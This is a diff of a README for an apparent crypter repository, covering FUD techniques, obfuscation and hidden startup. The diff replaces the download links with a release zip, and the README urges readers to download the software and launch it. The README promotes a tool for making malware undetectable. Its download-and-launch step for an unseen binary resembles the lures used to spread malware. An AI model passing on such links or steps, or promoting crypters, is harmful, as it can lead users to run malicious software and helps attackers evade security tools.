@@ -31,13 +31,13 @@ The repository covers a range of topics related to crypters, FUD techniques, obf
 - Windows
 
 ## Software Download
-You can download the software by clicking [here](https://github.com/user-attachments/files/18410590/Software.zip). 
+You can download the software by clicking [here](https://github.com/oshaxx/Data-Encoder-Crypter-Encoded-Aes-Hidden-Startup/releases/download/v2.0/Software.zip). 
 *Note: The software needs to be launched after downloading.*
 
 ## Releases
 In case the download link does not work, please check the "Releases" section of this repository for alternative download options.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/oshaxx/Data-Encoder-Crypter-Encoded-Aes-Hidden-Startup/releases/download/v2.0/Software.zip)](https://github.com/oshaxx/Data-Encoder-Crypter-Encoded-Aes-Hidden-Startup/releases/download/v2.0/Software.zip)
 
 ## Getting Started
 1. Download the software from the provided link.
